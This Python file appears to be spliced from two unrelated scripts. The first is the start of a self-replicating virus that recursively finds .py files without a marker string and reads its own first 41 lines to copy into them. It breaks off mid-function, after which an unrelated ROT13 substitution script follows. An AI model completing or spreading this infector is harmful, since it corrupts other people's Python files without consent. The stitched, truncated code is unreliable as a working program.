import os, datetime, inspect

DATA_TO_INSERT = "GEEKSFORGEEKS"


# search for target files in path
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for filename in filelist:

        # If it is a folder
        if os.path.isdir(path + "/" + filename):
            filestoinfect.extend(search(path + "/" + filename))

            # If it is a python script -> Infect it
        elif filename[-3:] == ".py":

            # default value
            infected = False
            for line in open(path + "/" + filename):
                if DATA_TO_INSERT in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path + "/" + filename)
    return filestoinfect


# changes to be made in the target file
def infect(filestoinfect):
    target_file = inspect.currentframe().f_code.co_filename
    virus = open(os.path.abspath(target_file))
    virusstring = ""
    for i, line in enumerate(virus):
        if i >= 0 and i < 41:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
import string
additional = " "
key = {'a':'n', 'b':'o', 'c':'p', 'd':'q', 'e':'r', 'f':'s', 'g':'t', 'h':'u','i':'v', 'j':'w', 'k':'x', 'l':'y', 'm':'z', 'n':'a', 'o':'b',
'p':'c','q':'d', 'r':'e', 's':'f', 't':'g', 'u':'h', 'v':'i', 'w':'j', 'x':'k', 'y':'l', 'z':'m', 'A':'N', 'B':'O', 'C':'P', 'D':'Q', 'E':'R', 'F':'S',
'G':'T', 'H':'U', 'I':'V', 'J':'W', 'K':'X', 'L':'Y', 'M':'Z', 'N':'A', 'O':'B', 'P':'C', 'Q':'D', 'R':'E', 'S':'F', 'T':'G', 'U':'H', 'V':'I',
'W':'J', 'X':'K', 'Y':'L', 'Z':'M'}

def iamconfused(input):
    new_txt = ''
    for item in input:
        for values in key.keys():
            if item == values:
                new_txt += key[item]
            if item in string.punctuation or item in string.digits or item in additional:
                new_txt += item
                break
    return new_txt

user_input = input("enter ur text")
print("output: "+'"'+iamconfused(user_input)+'"')
